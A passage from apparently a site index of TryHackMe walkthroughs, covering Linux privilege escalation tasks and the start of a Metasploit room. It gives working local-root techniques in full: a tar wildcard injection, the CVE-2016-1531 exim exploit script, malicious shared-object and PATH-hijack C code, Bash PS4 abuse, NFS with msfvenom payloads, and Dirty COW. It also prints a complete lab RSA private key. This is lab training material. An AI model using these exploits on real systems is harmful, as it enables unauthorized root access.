/bin/bash /home/user/rootbash\nchmod u+s /home/user/rootbash\n</code></pre> Before proceeding, we need to give the script executable permissions. Now let's make two more files with the following syntax in the <code>/home/user</code> directory:</p> <p><pre><code>touch /home/user/--checkpoint=1\ntouch /home/user/--checkpoint-action=exec=privesc.sh\n</code></pre> When the tar utility in the cron job runs, the wildcard () will expand to include the files we created above. Since their filenames are valid commands, *tar will recognize them as such and treat them as command line options rather than filenames.</p> <p>Once the scheduled task executes, we should see the rootbash binary in the <code>/home/user</code> folder with the SUID bit set. We can execute the rootbash binary to gain root access.</p> <p></p>"},{"location":"walkthroughs/thm/linuxprivesc/#task-11-suidsgid-guid-executables-known-exploits","title":"Task 11 - SUID/SGID (GUID) Executables - Known Exploits","text":"<p>For more information regarding SUID/GUID permissions, see SUID.</p> <p>The following command can be used to identify binaries which have SUID and GUID permissions assigned to them:</p> <p><pre><code>find / -type f -a \\( -perm -u+s -o -perm -g+s \\) -exec ls -l {} \\; 2&gt; /dev/null\n</code></pre> Alternatively, we can use the following command to get the same result:</p> <p><pre><code>find / -perm /u=s,g=s -type f -exec ls -l {} \\; 2&gt;/dev/null\n</code></pre> </p> <p>In the task description, we are told that the <code>/usr/sbin/exim-4.84-3</code> binary has a known exploit for this particular version of the exim utility. We can confirm this by searching the Exploit-DB database which reveals a Local Privilege Escalation exploit.</p> <p><pre><code>#!/bin/sh\n# CVE-2016-1531 exim &lt;= 4.84-3 local root exploit\n# ===============================================\n# you can write files as root or force a perl module to\n# load by manipulating the perl environment and running\n# exim with the \"perl_startup\" arguement -ps. \n#\n# e.g.\n# [fantastic@localhost tmp]$ ./cve-2016-1531.sh \n# [ CVE-2016-1531 local root exploit\n# sh-4.3# id\n# uid=0(root) gid=1000(fantastic) groups=1000(fantastic)\n# \n# -- Hacker Fantastic \necho [ CVE-2016-1531 local root exploit\ncat &gt; /tmp/root.pm &lt;&lt; EOF\npackage root;\nuse strict;\nuse warnings;\n\nsystem(\"/bin/sh\");\nEOF\nPERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps\n</code></pre> We can download the above exploit into the <code>/tmp</code> directory, mark it as executable, and execute it to get root privileges.</p> <p></p> <p></p>"},{"location":"walkthroughs/thm/linuxprivesc/#task-12-suidsgid-executables-shared-object-injection","title":"Task 12 - SUID/SGID Executables - Shared Object Injection","text":"<p>In this task, we are told that the <code>/usr/local/bin/suid-so</code> SUID binary is vulnerable to shared object injection. Let's confirm this by observing the behaviour of the binary when it is executed.</p> <p>Let's begin by executing the binary located at <code>/usr/local/bin/suid-so</code>. Note that a progress bar is displayed before the program exits.</p> <p></p> <p>We can look at the inner workings of the binary by using a utility called strace; strace is a diagnostic, debugging, and instructional userspace utility for the Linux OS. It intercepts and records the system calls which are called by a process and the signals which are received by a process.</p> <p><pre><code>strace /user/local/bin/suid-so 2&gt;&amp;1 | grep -iE \"open|access|no such file:\n</code></pre> </p> <p>Notice that the the output shows that the suid-so binary tries to load the <code>/home/user/.config/libcalc.so</code> shared object which does not exist. We can exploit this to gain privilege escalation by creating a malicious shared object in the specified directory which will get called when the suid-so binary gets executed.</p> <p>Let's start by creating the <code>/home/user/.config</code> directory.</p> <p><pre><code>mkdir /home/user/.config\n</code></pre> We can now create a shared object with the following code which will spawn a Bash shell. Save the file to the <code>/home/user/.config</code> folder as libcalc.c.</p> <p><pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nstatic void inject() __attribute__((constructor));\n\nvoid inject() {\n        setuid(0);\n        system(\"/bin/bash -p\");\n}\n</code></pre> </p> <p>Let's compile the code using gcc into a shared object using the following syntax:</p> <p><pre><code>gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/.config/libcalc.c\n</code></pre> </p> <p>Now let's execute the suid-so binary and see if we get root privileges.</p> <p></p>"},{"location":"walkthroughs/thm/linuxprivesc/#task-13-suidsgid-executables-environment-variables","title":"Task 13 - SUID/SGID Executables - Environment Variables","text":"<p>In this task, we are told that the <code>/usr/local/bin/suid-env</code> binary can be exploited due to it inheriting the user's PATH environment variable and attempting to execute programs without specifying an absolute path.</p> <p>Let's execute the binary to see what it does.</p> <p></p> <p>Looks like when the binary is executed, it starts the apache2 webserver.</p> <p>Since we do not have the source code of the binary in question, we can't simply go through the code to figure out what is going on. A good next step is to run the strings utility on the binary. The strings utility prints the printable character sequences that are at least four character long and are followed by an unprintable character. It is a useful utility for determining the contents of a non-text file and is often the first step when reverse-engineering a binary.</p> <p>Let's run the strings utility against the binary and look at the results.</p> <p></p> <p>Based on the strings output, it looks like the binary attempts to start apache2 using the service binary without specifying its absolute path (<code>/usr/sbin/service</code>). Note that the service binary typically has the SUID bit set by default.</p> <p>Let's exploit this by creating our own binary with the same name which loads a simple Bash shell. We can use the following code:</p> <p><pre><code>int main() {\n        setuid(0);\n        system(\"/bin/bash -p\");\n}\n</code></pre> </p> <p>Let's compile our code using gcc.</p> <p><pre><code>gcc -o service /tmp/service.c\n</code></pre> </p> <p>Now all we need to do is prepend the directory where our malicious binary is located to the PATH variable and then execute the suid-env binary again to gain root privileges.</p> <p><pre><code>PATH=/tmp:$PATH\n</code></pre> </p>"},{"location":"walkthroughs/thm/linuxprivesc/#task-14-suidsgid-executables-abusing-shell-features-1","title":"Task 14 - SUID/SGID Executables - Abusing Shell Features (#1)","text":"<p>In this task, the suid-env has been updated to use absolute path of the service executable (<code>/usr/sbin/service</code>) to start the apache2 webserver. We can verify this by running the strings utility on the new binary sudo-env2.</p> <p></p> <p>We cannot rely on the previous method using Environment Variables to get privilege escalation.</p> <p>In this task, we will be looking we will exploiting a feature in Bash (versions &lt; 4.2-048) which make it possible to define shell functions with names that resemble file paths. By exporting these functions, binaries in the vulnerable versions of Bash could be forced to use the exported functions instead of the actual executable at that file path.</p> <p>Let's see this in action. We first need to verify the version of Bash installed on the machine.</p> <p><pre><code>/bin/bash --version\n</code></pre> </p> <p>Looks like the Bash version running on the machine is vulnerable to this attack.</p> <p>Let's create a Bash function and export it with the name <code>/usr/sbin/service</code> that executes a new Bash shell (using -p to retain permissions).</p> <p><pre><code>function /usr/sbin/service { /bin/bash -p; }\nexport -f /usr/sbin/service\n</code></pre> Once the function is exported, run the suid-env2 binary to gain a root shell.</p> <p></p>"},{"location":"walkthroughs/thm/linuxprivesc/#task-15-suidsgid-executables-abusing-shell-features-2","title":"Task 15 - SUID/SGID Executables - Abusing Shell Features (#2)","text":"<p>In this task, we will be abusing the debugging mode in Bash shell (version &lt; 4.4). Bash versions less than 4.4 uses the environment variable PS4 to display an extra prompt for debugging statements. Debugging statements can be used to embed commands which present an privilege escalation vector for attackers.</p> <p>Let's run the <code>/usr/local/bin/suid-env2</code> binary with Bash debugging enabled and the PS4 variable set to an embedded command wich creates an SUID version of <code>/bin/bash</code>.</p> <p><pre><code>env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2\n</code></pre> </p> <p>We can then run the rootbash binary with the <code>-p</code> argument to get root privileges.</p> <p></p>"},{"location":"walkthroughs/thm/linuxprivesc/#task-16-password-keys-history-files","title":"Task 16 - Password &amp; Keys - History Files","text":"<p>It is not uncommon for Linux users to accidentally type their password on the command line instead of into a password prompt. As most Linux shells keep a history of user input, these passwords may get recorded in a history file. It is worthwhile going through these history files to see what you can find as a low hanging fruit.</p> <p>We can view contents of all the hidden history files in the user's directory using the following command:</p> <pre><code>cat ~/.*history | less\n</code></pre>"},{"location":"walkthroughs/thm/linuxprivesc/#task-17-password-keys-config-files","title":"Task 17 - Password &amp; Keys - Config Files","text":"<p>Configuration files often contain passwords in plaintext or other reversible formats. Enumerating the services present on the machine can help direct attackers to relevant config files to parse for credentials.</p> <p>Let's look at an example for OpenVPN service.</p> <p></p> <p>The OpenVPN config file contains a reference to another location where the root user's credentials can be found.</p> <p></p>"},{"location":"walkthroughs/thm/linuxprivesc/#task-18-passwords-keys-ssh-keys","title":"Task 18 - Passwords &amp; Keys - SSH Keys","text":"<p>Users may mistakenly make backups of important files without taking precautions to save guard them with correct permissions.</p> <p>We can look for hidden files and directories in the system root by using the <code>ls -la /</code> command. One less common privilege escalation vector in practical engagements (more common in CTF challenges) is the presence of a user's private SSH key.</p> <p>Listing the hidden files and directories on our target system, we find a hidden <code>.ssh</code> directory with a globally readable private SSH key for the root user (root_key).</p> <p></p> <p>We can copy the contents of the private key to a similarly named file on our local system and give it appropriate permissions.</p> <p><pre><code>-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA3IIf6Wczcdm38MZ9+QADSYq9FfKfwj0mJaUteyJHWHZ3/GNm\ngLTH3Fov2Ss8QuGfvvD4CQ1f4N0PqnaJ2WJrKSP8QyxJ7YtRTk0JoTSGWTeUpExl\np4oSmTxYnO0LDcsezwNhBZn0kljtGu9p+dmmKbk40W4SWlTvU1LcEHRr6RgWMgQo\nOHhxUFddFtYrknS4GiL5TJH6bt57xoIECnRc/8suZyWzgRzbo+TvDewK3ZhBN7HD\neV9G5JrjnVrDqSjhysUANmUTjUCTSsofUwlum+pU/dl9YCkXJRp7Hgy/QkFKpFET\nZ36Z0g1JtQkwWxUD/iFj+iapkLuMaVT5dCq9kQIDAQABAoIBAQDDWdSDppYA6uz2\nNiMsEULYSD0z0HqQTjQZbbhZOgkS6gFqa3VH2OCm6o8xSghdCB3Jvxk+i8bBI5bZ\nYaLGH1boX6UArZ/g/mfNgpphYnMTXxYkaDo2ry/C6Z9nhukgEy78HvY5TCdL79Q+\n5JNyccuvcxRPFcDUniJYIzQqr7laCgNU2R1lL87Qai6B6gJpyB9cP68rA02244el\nWUXcZTk68p9dk2Q3tk3r/oYHf2LTkgPShXBEwP1VkF/2FFPvwi1JCCMUGS27avN7\nVDFru8hDPCCmE3j4N9Sw6X/sSDR9ESg4+iNTsD2ziwGDYnizzY2e1+75zLyYZ4N7\n6JoPCYFxAoGBAPi0ALpmNz17iFClfIqDrunUy8JT4aFxl0kQ5y9rKeFwNu50nTIW\n1X+343539fKIcuPB0JY9ZkO9d4tp8M1Slebv/p4ITdKf43yTjClbd/FpyG2QNy3K\n824ihKlQVDC9eYezWWs2pqZk/AqO2IHSlzL4v0T0GyzOsKJH6NGTvYhrAoGBAOL6\nWg07OXE08XsLJE+ujVPH4DQMqRz/G1vwztPkSmeqZ8/qsLW2bINLhndZdd1FaPzc\nU7LXiuDNcl5u+Pihbv73rPNZOsixkklb5t3Jg1OcvvYcL6hMRwLL4iqG8YDBmlK1\nRg1CjY1csnqTOMJUVEHy0ofroEMLf/0uVRP3VsDzAoGBAIKFJSSt5Cu2GxIH51Zi\nSXeaH906XF132aeU4V83ZGFVnN6EAMN6zE0c2p1So5bHGVSCMM/IJVVDp+tYi/GV\nd+oc5YlWXlE9bAvC+3nw8P+XPoKRfwPfUOXp46lf6O8zYQZgj3r+0XLd6JA561Im\njQdJGEg9u81GI9jm2D60xHFFAoGAPFatRcMuvAeFAl6t4njWnSUPVwbelhTDIyfa\n871GglRskHslSskaA7U6I9QmXxIqnL29ild+VdCHzM7XZNEVfrY8xdw8okmCR/ok\nX2VIghuzMB3CFY1hez7T+tYwsTfGXKJP4wqEMsYntCoa9p4QYA+7I+LhkbEm7xk4\nCLzB1T0CgYB2Ijb2DpcWlxjX08JRVi8+R7T2Fhh4L5FuykcDeZm1OvYeCML32EfN\nWhp/Mr5B5GDmMHBRtKaiLS8/NRAokiibsCmMzQegmfipo+35DNTW66DDq47RFgR4\nLnM9yXzn+CbIJGeJk5XUFQuLSv0f6uiaWNi7t9UNyayRmwejI6phSw==\n-----END RSA PRIVATE KEY-----\n</code></pre> <pre><code>chmod 600 root_key\n</code></pre> </p> <p>We can now SSH into the machine using the private key as root. Note that for this task, the private key does not have a password configured. In most sceneries, a private SSH key would have been configured with a password which would need to be cracked using John the Ripper.</p> <p><pre><code>ssh -i root_key root@10.10.114.180 -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa\n</code></pre> Also note that due to the age of the machine, we needed to add additional parameters indicating the key type and algorithm which aren't necessarily required for more modern systems.</p> <p></p>"},{"location":"walkthroughs/thm/linuxprivesc/#task-19-nfs","title":"Task 19 - NFS","text":"<p>Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the nobody user.</p> <p>In our task, we can check the NFS share configuration on the machine using the following command:</p> <p><pre><code>cat /etc/exports\n</code></pre> </p> <p>Note that in our case, the <code>/tmp</code> share has root squashing disabled. On our machine, we can now switch to the root user, create a mount point, and mound the <code>/tmp</code> share as indicated below.</p> <p><pre><code>mkdir /tmp/nfs\nmount -o rw, vers=3 10.10.114.180:/tmp /tmp/nfs\n</code></pre> </p> <p>We can now use msfvenom to create a payload which executes <code>/bin/bash</code> with the <code>-p</code> option to retain permissions.</p> <p><pre><code>msfvenom -p linux/x86/exec CMD=\"/bin/bash -p\" -f elf -o /tmp/nfs/shell.elf\n</code></pre> Mark the payload as executable and set SUID permissions.</p> <p><pre><code>chmod +xs /tmp/nfs/shell.elf\n</code></pre> </p> <p>Now back on our target machine, we can execute the payload in the <code>/tmp</code> share folder to get our privilege escalation.</p> <p></p>"},{"location":"walkthroughs/thm/linuxprivesc/#task-20-kernel-exploits","title":"Task 20 - Kernel Exploits","text":"<p>Warning</p> <p>Kernel exploits can leave the system in an unstable state and should be only ran as a last resort.</p> <p>On our target system, we can run the Linux Exploit Suggester 2 tool to identify potential kernel exploits on the current system.</p> <p><pre><code>perl /tmp/linux-exploit-suggester-2.pl\n</code></pre> </p> <p>The popular Linux kernel exploit Dirty COW is listed as one of the suggested exploits. We can obtain the exploit from Exploit-DB Dirty COW. Let's compile the code and run it. Note that hte exploit may take several minutes to complete.</p> <p><pre><code>gcc -pthread /tmp/c0w.c -o c0w\n</code></pre> <pre><code>./c0w\n</code></pre> Once the exploit completes, we can run <code>/usr/bin/passwd</code> to gain root privileges.</p> <p></p>"},{"location":"walkthroughs/thm/linuxprivesc/#task-21-privilege-escalation-scripts","title":"Task 21 - Privilege Escalation Scripts","text":"<p>There are several scripts available which can aid us in finding and identifying possible privilege escalation vectors on Linux. Below is a list of some useful scripts:</p> <ul> <li>LinEnum</li> <li>LinPEAS</li> <li>Linux Smart Enumeration</li> <li>Linux Exploit Suggester 2</li> </ul>"},{"location":"walkthroughs/thm/metasploitexploitation/","title":"Metasploit - Exploitation","text":""},{"location":"walkthroughs/thm/metasploitexploitation/#task-1-introduction","title":"Task 1 - Introduction","text":"<p>This room covers topics related to the use of Metasploit for vulnerability scanning and exploitation. The topics covered are as follows:</p> <ul> <li>How to scan target systems using Metasploit.</li> <li>How to use the Metasploit database feature.</li> <li>How to use Metasploit to conduct a vulnerability scan.</li> <li>How to use Metasploit to exploit vulnerable services on target systems.</li> <li>How <code>msvenom</code> can be used to create payloads and obtain a Meterpreter session on the target system.</li> </ul>"},{"location":"walkthroughs/thm/metasploitexploitation/#task-2-scanning","title":"Task 2 - Scanning","text":"<p>In this task, scanning capabilities of Metasploit are covered.</p>"},{"location":"walkthroughs/thm/metasploitexploitation/#port-scanning","title":"Port Scanning","text":"<p>Metasploit has a number of modules capable of scanning open ports on a target system and network. Potential port scanning modules can be listed using the <code>search portscan</code> command.</p> <p><pre><code>msf6 &gt; search portscan\n\nMatching Modules\n================\n\n   #  Name                                              Disclosure Date  Rank    Check  Description\n   -  ----                                              ---------------  ----    -----  -----------\n   0  auxiliary/scanner/portscan/ftpbounce                               normal  No     FTP Bounce Port Scanner\n   1  auxiliary/scanner/natpmp/natpmp_portscan                           normal  No     NAT-PMP External Port Scanner\n   2  auxiliary/scanner/sap/sap_router_portscanner                       normal  No     SAPRouter Port Scanner\n   3  auxiliary/scanner/portscan/xmas                                    normal  No     TCP \"XMas\" Port Scanner\n   4  auxiliary/scanner/portscan/ack                                     normal  No     TCP ACK Firewall Scanner\n   5  auxiliary/scanner/portscan/tcp                                     normal  No     TCP Port Scanner\n   6  auxiliary/scanner/portscan/syn                                     normal  No     TCP SYN Port Scanner\n   7  auxiliary/scanner/http/wordpress_pingback_access                   normal  No     Wordpress Pingback Locator\n</code></pre> We can also perfom an Nmap scan directly from the msfconsole prompt.</p> <pre><code>msf6 &gt; sudo nmap -sS 10.10.0.45\n[*] exec: sudo nmap -sS 10.10.0.45\n\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-03-03 10:31 MST\nNmap scan report for 10.10.0.45\nHost is up (0.20s latency).\nNot shown: 995 closed tcp ports (reset)\nPORT     STATE SERVICE\n21/tcp   open  ftp\n22/tcp   open  ssh\n139/tcp  open  netbios-ssn\n445/tcp  open  microsoft-ds\n8000/tcp open  http-alt\n\nNmap done: 1 IP address (1 host up) scanned in 14.83 seconds\n</code></pre>"},{"location":"walkthroughs/thm/metasploitexploitation/#udp-service-identification","title":"UDP Service Identification","text":"<p>The <code>scanner/discovery/udp_sweep</code> module allows us to quickly identify services running over UDP. This module does not conduct an extensive scan of all possible UDP services but does provide a quick way to identify services such as DNS or NetBIOS.</p> <pre><code>msf6 auxiliary(scanner/discovery/udp_sweep) &gt; show options\n\nModule options (auxiliary/scanner/discovery/udp_sweep):\n\n   Name       Current Setting  Required  Description\n   ----       ---------------  --------  -----------\n   BATCHSIZE  256              yes       The number of hosts to probe in each set\n   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit\n                                         /basics/using-metasploit.html\n   THREADS    10               yes       The number of concurrent threads\n\n\nView the full module info with the info, or info -d command.\n\nmsf6 auxiliary(scanner/discovery/udp_sweep) &gt; set rhosts 10.10.0.45\nrhosts =&gt; 10.10.0.45\nmsf6 auxiliary(scanner/discovery/udp_sweep) &gt; run\n\n[*] Sending 13 probes to 10.10.0.45-&gt;10.10.0.45 (1 hosts)\n[*] Discovered NetBIOS on 10.10.0.45:137 (IP-10-10-0-45:&lt;00&gt;:U :IP-10-10-0-45:&lt;03&gt;:U :IP-10-10-0-45:&lt;20&gt;:U :__MSBROWSE__:&lt;01&gt;:G :ACME IT SUPPORT:&lt;00&gt;:G :ACME IT SUPPORT:&lt;1d&gt;:U :ACME IT SUPPORT:&lt;1e&gt;:G :00:00:00:00:00:00)\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n</code></pre>"},{"location":"walkthroughs/thm/metasploitexploitation/#smb-scans","title":"SMB Scans","text":"<p>Metasploit offers several auxiliary modules to scan services like SMB. SMB modules such as <code>smb_enumshares</code> and <code>smb_version</code> are particularly useful in a corporate network.</p> <p><pre><code>msf6 auxiliary(scanner/smb/smb_version) &gt; show options\n\nModule options (auxiliary/scanner/smb/smb_version):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/b\n                                       asics/using-metasploit.html\n   THREADS  1                yes       The number of concurrent threads (max one per host)\n\nView the full module info with the info, or info -d command.\n\nmsf6 auxiliary(scanner/smb/smb_version) &gt; set rhost 10.10.0.45\nrhost =&gt; 10.10.0.45\nmsf6 auxiliary(scanner/smb/smb_version) &gt; run\n\n[*] 10.10.0.45:445        - SMB Detected (versions:1, 2, 3) (preferred dialect:SMB 3.1.1) (compression capabilities:) (encryption capabilities:AES-128-CCM) (signatures:optional) (guid:{312d7069-2d30-3031-2d30-2d3435000000}) (authentication domain:IP-10-10-0-45)\n[*] 10.10.0.45:445        -   Host could not be identified: Windows 6.1 (Samba 4.7.6-Ubuntu)\n[*] 10.10.0.45:           - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n</code></pre> Side Note: </p> <p>NetBIOS (Network Basic Input Output System), similar to SMB, allows computers to communicate over the network to share files or send files to printers. The NetBIOS name of the target system can give you idea about its role and even importance (e.g. CORP-DC, DEVOPS, SALES, etc.). You may also run across some shared files and folders that could be accessed either without a password or protected with a simple password (e.g. admin, administrator, root, toor, etc.).</p>"},{"location":"walkthroughs/thm/metasploitexploitation/#task-3-the-metasploit-database","title":"Task 3 - The Metasploit Database","text":"<p>Metasploit has a database function to simplify project management and avoid possible confusion when setting up parameter values.</p> <p>We first need to start the PorstgreSQL database which Metasploit will then use.</p> <p><pre><code>\u250c\u2500\u2500(siachen\u327fkali)-[~/CyberSec/THM/metasploit_exploitation]\n\u2514\u2500$ sudo systemctl start postgresql         \n\n\u250c\u2500\u2500(siachen\u327fkali)-[~/CyberSec/THM/metasploit_exploitation]\n\u2514\u2500$ sudo msfdb init                \n[i] Database already started\n[+] Creating database user 'msf'\n[+] Creating databases 'msf'\n[+] Creating databases 'msf_test'\n[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'\n[+] Creating initial database schema\n</code></pre> The status of the database can be checked within the <code>msfconsole</code>.</p> <p><pre><code>msf6 &gt; db_status\n[*] Connected to msf. Connection type: postgresql.\n</code></pre> The database feature allows the creation of workspaces to isolate different projects. When first launched, we will be in the default workspace. List of available workspaces can be checked using the <code>workspace</code> command.</p> <p><pre><code>msf6 &gt; workspace\n* default\n</code></pre> Workspaces can be added using <code>-a</code> parameter or deleted using the <code>-d</code> parameter.</p> <p><pre><code>msf6 &gt; workspace -a tryhackme\n[*] Added workspace: tryhackme\n[*] Workspace: tryhackme\nmsf6 &gt; workspace\n  default\n* tryhackme\n</code></pre> The <code>*</code> indicates the selected (or active) workspace. To switch to a different workspace simply follow the <code>workspace</code> command with the name of the desired workspace.</p> <p><pre><code>msf6 &gt; workspace default\n[*] Workspace: default\nmsf6 &gt; workspace\n  tryhackme\n* default\n</code></pre> The <code>workspace -h</code> command can be used to list all available options for the <code>workspace</code> command.</p> <p><pre><code>msf6 &gt; workspace -h\nUsage:\n    workspace          List workspaces\n    workspace [name]   Switch workspace\n\nOPTIONS:\n\n    -a, --add &lt;name&gt;          Add a workspace.\n    -d, --delete &lt;name&gt;       Delete a workspace.\n    -D, --delete-all          Delete all workspaces.\n    -h, --help                Help banner.\n    -l, --list                List workspaces.\n    -r, --rename &lt;old&gt; &lt;new&gt;  Rename a workspace.\n    -S, --search &lt;name&gt;       Search for a workspace.\n    -v, --list-verbose        List workspaces verbosely.\n</code></pre> Once Metasploit is launched with a database, the <code>help</code> command will also show the Database Backend Command menu.</p> <p>If we were to now urn an Nmap scan using the command <code>db_nmap</code>, all results will be saved to the database.</p> <p><pre><code>msf6 &gt; db_nmap -sV 10.10.207.51\n[*] Nmap: Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-03 16:06 MST\n[*] Nmap: Nmap scan report for 10.10.207.51\n[*] Nmap: Host is up (0.19s latency).\n[*] Nmap: Not shown: 995 closed tcp ports (conn-refused)\n[*] Nmap: PORT     STATE SERVICE     VERSION\n[*] Nmap: 21/tcp   open  ftp         ProFTPD 1.3.5e\n[*] Nmap: 22/tcp   open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n[*] Nmap: 139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: ACME IT SUPPORT)\n[*] Nmap: 445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: ACME IT SUPPORT)\n[*] Nmap: 8000/tcp open  http        WebFS httpd 1.21\n[*] Nmap: Service Info: Host: IP-10-10-207-51; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 50.45 seconds\n</code></pre> Information relevant to hosts and services running on target systems can be checked with the <code>hosts</code> and <code>services</code> commands. The <code>hosts -h</code> and <code>services -h</code> commands will display their respective available options.</p> <p><pre><code>msf6 &gt; hosts\n\nHosts\n=====\n\naddress       mac  name  os_name  os_flavor  os_sp  purpose  info  comments\n-------       ---  ----  -------  ---------  -----  -------  ----  --------\n10.10.207.51             Unknown                    device\n\nmsf6 &gt; services\nServices\n========\n\nhost          port  proto  name         state  info\n----          ----  -----  ----         -----  ----\n10.10.207.51  21    tcp    ftp          open   ProFTPD 1.3.5e\n10.10.207.51  22    tcp    ssh          open   OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 Ubuntu Linux; protocol 2.0\n10.10.207.51  139   tcp    netbios-ssn  open   Samba smbd 3.X - 4.X workgroup: ACME IT SUPPORT\n10.10.207.51  445   tcp    netbios-ssn  open   Samba smbd 3.X - 4.X workgroup: ACME IT SUPPORT\n10.10.207.51  8000  tcp    http         open   WebFS httpd 1.21\n</code></pre> Once the host information is stored in the database, we can use the <code>hosts -R</code> command to add this value to the RHOSTS parameter in modules. An example workflow is as follows:</p> <ol> <li>Let's use the vulnerability scanning module that finds potential MS17-010 vulnerabilities with the <code>use auxiliary/scanner/smb/smb_ms17_010</code> command.</li> <li>Set the RHOSTS value using <code>hosts -R</code>.</li> <li>Use <code>show options</code> to check if all values were assigned properly.</li> <li>Launch the exploit using either <code>run</code> or <code>exploit</code>.</li> </ol> <p><pre><code>msf6 &gt; use auxiliary/scanner/smb/smb_ms17_010\nmsf6 auxiliary(scanner/smb/smb_ms17_010) &gt; hosts -R\n\nHosts\n=====\n\naddress       mac  name  os_name  os_flavor  os_sp  purpose  info  comments\n-------       ---  ----  -------  ---------  -----  -------  ----  --------\n10.10.207.51             Unknown                    device\n\nRHOSTS =&gt; 10.10.207.51\n\nmsf6 auxiliary(scanner/smb/smb_ms17_010) &gt; show options\n\nModule options (auxiliary/scanner/smb/smb_ms17_010):\n\n   Name         Current Setting                  Required  Description\n   ----         ---------------                  --------  -----------\n   CHECK_ARCH   true                             no        Check for architecture on vulnerable hosts\n   CHECK_DOPU   true                             no        Check for DOUBLEPULSAR on vulnerable hosts\n   CHECK_PIPE   false                            no        Check for named pipe on vulnerable hosts\n   NAMED_PIPES  /usr/share/metasploit-framework  yes       List of named pipes to check\n                /data/wordlists/named_pipes.txt\n   RHOSTS       10.10.207.51                     yes       The target host(s), see https://docs.metasploit.com/doc\n                                                           s/using-metasploit/basics/using-metasploit.html\n   RPORT        445                              yes       The SMB service port (TCP)\n   SMBDomain    .                                no        The Windows domain to use for authentication\n   SMBPass                                       no        The password for the specified username\n   SMBUser                                       no        The username to authenticate as\n   THREADS      1                                yes       The number of concurrent threads (max one per host)\n\n\nView the full module info with the info, or info -d command.\n\nmsf6 auxiliary(scanner/smb/smb_ms17_010) &gt; run\n\n[-] 10.10.207.51:445      - Host does NOT appear vulnerable.\n[*] 10.10.207.51:445      - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n</code></pre> Note that if there is more than one host saved in the database, all IP addresses will be used when the <code>hosts -R</code> command is used. In a typical penetration testing engagement, we could have to following scenario: - Finding available hosts using the <code>db_nmap</code> command. - Scanning these for further vulnerabilities or open ports (using a port scanning module).</p> <p>The services command sued with the <code>-S</code> parameter will allow us to search for specific services in the environment.</p> <p><pre><code>msf6 &gt; services -S netbios\nServices\n========\n\nhost          port  proto  name         state  info\n----          ----  -----  ----         -----  ----\n10.10.207.51  139   tcp    netbios-ssn  open   Samba smbd 3.X - 4.X workgroup: ACME IT SUPPORT\n10.10.207.51  445   tcp    netbios-ssn  open   Samba smbd 3.X - 4.X workgroup: ACME IT SUPPORT\n</code></pre> Some low-hanging fruit to lookout for: - HTTP: Could potentially host a web application where we can find vulnerabilities like SQL injection or RCE. - FTP: Could allow anonymous login and provide access to interesting files. - SMB: Could be vulnerable to SMB exploits like Eternal Blue (MS17-010). - SSH: Could have default or easy to guess credentials. - RDP: Could be vulnerable to Bluekeep or allow desktop access if weak credentials were used.</p>"},{"location":"walkthroughs/thm/metasploitexploitation/#task-4-vulnerability-scanning","title":"Task 4 - Vulnerability Scanning","text":"<p>Metasploit allows quick identification of critical vulnerabilities. Finding vulnerabilities using Metasploit relies heavily on our ability to scan and fingerprint targets.</p> <p>For example, say during our enumeration we identify VNC service running on the target. We can use the <code>search VNC</code> function in Metasploit to list all modules related to VNC. These results will contain payloads and post modules. Using the <code>info</code> command, we can get more information on a desired module to get a better understanding of its use and purpose.</p>"},{"location":"walkthroughs/thm/metasploitexploitation/#task-5-exploitation","title":"Task 5 - Exploitation","text":"<p>Metasploit by nature is an exploitation framework. Exploits are the most populated module category.</p> <p>Exploits can be searched using the <code>search</code> command. Like with modules, we can get more information about an exploit using the <code>info</code> command and launch the exploit using <code>run</code> or <code>exploit</code>.</p> <p>Most exploits will have a preset default payload. We can always use the <code>show payloads</code> command to list other commands that can be used with that specific exploit.</p> <p><pre><code>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show payloads\n\nCompatible Payloads\n===================\n\n   #   Name                                                Disclosure Date  Rank    Check  Description\n   -   ----                                                ---------------  ----    -----  -----------\n   0   payload/generic/custom                                               normal  No     Custom Payload\n   1   payload/generic/shell_bind_tcp                                       normal  No     Generic Command Shell, Bind TCP Inline\n   2   payload/generic/shell_reverse_tcp                                    normal  No     Generic Command Shell, Reverse TCP Inline\n   3   payload/generic/ssh/interact                                         normal  No     Interact with Established SSH Connection\n   4   payload/windows/x64/custom/bind_ipv6_tcp                             normal  No     Windows shellcode stage, Windows x64 IPv6 Bind TCP Stager\n   5   payload/windows/x64/custom/bind_ipv6_tcp_uuid                        normal  No     Windows shellcode stage, Windows x64 IPv6 Bind TCP Stager with UUID Support\n   6   payload/windows/x64/custom/bind_named_pipe                           normal  No     Windows shellcode stage, Windows x64 Bind Named Pipe Stager\n   7   payload/windows/x64/custom/bind_tcp                                  normal  No     Windows shellcode stage, Windows x64 Bind TCP Stager\n   8   payload/windows/x64/custom/bind_tcp_rc4                              normal  No     Windows shellcode stage, Bind TCP Stager (RC4 Stage Encryption, Metasm)\n   9   payload/windows/x64/custom/bind_tcp_uuid                             normal  No     Windows 